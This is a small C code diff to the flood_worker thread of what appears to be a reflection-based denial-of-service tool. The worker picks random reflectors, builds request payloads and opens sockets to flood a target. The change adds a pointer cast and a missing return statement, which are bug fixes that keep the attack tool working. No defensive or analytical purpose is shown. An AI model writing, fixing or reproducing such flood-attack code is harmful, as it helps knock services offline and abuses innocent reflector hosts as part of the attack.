@@ -23,7 +23,7 @@ static void* flood_worker(void* attack_data) {
     if(rand_reflector != NULL) {
       pthread_mutex_lock(&main_mutex);
       char* payload_data = xml_http_request(attack, rand_reflector);
-      conn->client_host = rand_reflector->host;
+      conn->client_host = (char*)rand_reflector->host;
       pthread_mutex_unlock(&main_mutex);
 
       socket_t sock = socket_create(conn);
@@ -40,6 +40,8 @@ static void* flood_worker(void* attack_data) {
   #ifdef DEBUG
     printf("Thread exited at %ld\n", time(NULL));
   #endif
+  
+  return NULL;
 }
 
 void flood_start(attack_t* attack) {
